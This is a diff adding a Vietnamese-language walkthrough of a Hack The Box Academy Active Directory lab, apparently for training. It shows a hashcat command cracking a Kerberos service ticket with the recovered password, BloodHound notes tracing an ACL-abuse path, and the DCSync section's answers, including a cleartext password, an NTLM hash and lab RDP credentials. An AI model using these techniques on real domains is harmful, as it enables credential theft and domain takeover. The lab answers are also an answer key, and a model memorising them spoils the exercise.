+Tiến hành crack với hashcat:
+
+```zhs
+hashcat -m 13100 adunn_tgs /usr/share/wordlists/rockyou.txt
+```
+
+```zsh
+$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$1cdb08cc4967c1a613a1be36bb81a80d$50285cb55c6e039ec88b1599b15da96e5890a6ca8b4ef5bc05e5d1b365a8520ff258fe901dbcc9ecdf0cfa7f8d2715f79cba177e946a967345a5df4e3cd51e67fccf69f1aa3ab828ee5508c95c96e45dcedaa6d62c952587e131f70e0d9057da112aa9d2c3ff7d557d02eeae2869a6e24bdbfc8ffd2f264ccfa4f3234548328af429c9600b1d9906927d8ff3e66f6976438309c80d3b28406140bc1c1f10e405ca739b4217ec27047a6bc65520f0884b9d41a11ff715d0357c46ae1defe43ae32c10e383ea4e7ac2ae8ab056ebb2efb6ac33cd27be8a6e33bd4ecaf8f74772b566f1b276ae6a38809852caeea8050dca1a190f670457ac1a67248189b8b601031c7916c9bfeab454312a68259d28becf777f5e15d2ab07e47688641eff17ad50a39baa80e5387dc191f73ca2ccb57444d127e2a6c580d1562cbe2b0ba605a08806f6c28fea6b833ed4004f51cfd7b4b1c4a4b8c4226c1291495f86a79efc6acbf9d6402d80ce9d8a1cc654b49700cda8a8e868437bb2708583c9d970e5f5523af0694ab5fdb94dac3d1f9bedaefef47391c7edbdfb67ef5ac990ca0e3c11302c8617225c5a18622302fdee786ab61b35e52e1df45b579d73d505165707fa78bf9e9af8102b01475f377b573570e46343b853d15e03fd4166cfc8a6da26b01f476b3943347f8a0815e167e1005b6252743396b01347aadd0826e1a29d3d23e41f8b7d613b2f2c809caaf2232de14631955b095d5255bd2605448350b7d76a01cbffa377782d3798b3b1658dc13a6813db38a38c0450fb20b256a901635610aae3970f9bb4e29c8240f45ce4b9eccc428928b0455bd94b0714a1890491b890c15f98cb3ee6d78c88434ef3a5d6f1b93c7e18b1e19c08ba843ea68bdcdb970da07d2d3ac792c15631496641d131bff346717fabb1401565f33f8249df99e7afea0a902bd9a6eeb2feecc5d912e593c699406a0f6b8163e2be32f0285797bbc80cd5fe6faec3f176b409f693623b13b99f6114aafabeb38b997a73dd5dfc6d0088d8e980c44fe350763f245c0b2a5988290eaa55bd9ae499693c6567180b71c599a40a0ae6a8fadbee1a9e29b679a2f337790ec6f2e0c621f1ce8b6ccd50d8dabb75bfa28b2f226d56447a42894a2ffa7f8a8437d0b93373fcb6403fcd802e7c6a70f3bc21a4f5e5da84ddb856076938695da1155436cccaa83277e477fadb05554e36846ea194270d2c6e5e859c61c32f9b513bd6e5583dd72cde17e99128abac35a3f99669e7d0fd622155003ca413205efdbf71526aa438d5a995d8ec37c076b44c50253c445f5a56dcbab37195096d15b7819575e0f8a6941669e6339bf97d37fdac3f5fa12007f47fb56983e5fbde5e5ddab6390b88d263ac64a3b8ef32be0344bc2dd04acead2c5d90f8c9319c52371b8767a84fbb247433682d3f5e145d7a8f818747edf97311dd556c673681a8fa0b27796ab1c02f67a08d7127c2cb3111afa0291bbc9969bbb47ba92ff866edb325b0d2a153e2b79ae71566c060b2cd1f5d383c93c3ba5181d9f42e031e099cc22e6963833ed4a15cbd95c3e4fb4b5e4307d22b7d421ac94bb23c165fd4c2ae71429604ca56b91408373baca9caeada633066bfcf912f93c1adcf498267ffc4429f4af522d4d306ece2:SyncMaster757
+```
+
+
+Ok giờ chúng ta sẽ đơn giản hóa hơn với BloodHound:
+
+Search Node `wley`:
+
+![](images/14.png)
+
+Tại OutBound Object Control ta thấy Wley có ForceChangePassword đối với damundsen:
+
+![](images/15.png)
+
+Làm tương tự với damundsen, anh ta có quyền GenericWrite / AddSelf đối với nhóm help desk lv 1.
+Đơn giản hơn chắc chắn damundsen có quyền tự thêm anh ta vào nhóm.
+
+![](images/16.png)
+
+Tiếp tục, tại outbound của nhóm help desk, ta thấy help desk là thành viên của nhóm IT, nhóm IT này có quyền GenericAll đối với adunn, do đó, damundsen cũng có quyền tương tự vì anh ta trong nhóm nested với nhóm IT  để thừa hưởng đặc quyền này.
+
+![](images/17.png)
+
+# DCSync
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.132.117 (ACADEMY-EA-MS01) ,10.129.150.184 (ACADEMY-EA-ATTACK01)   
+
+Life Left: 149 Terminate 
+
+ RDP to 10.129.132.117 (ACADEMY-EA-MS01) ,10.129.150.184 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "Academy_student_AD!"
+
++ 0  Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer.
+
+syncron
+
++ 0  What is this user's cleartext password?
+
+Mycleart3xtP@ss!
+
++ 0  Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.
+
+4bb3b317845f0954200a6b0acc9b9f9a
+
+
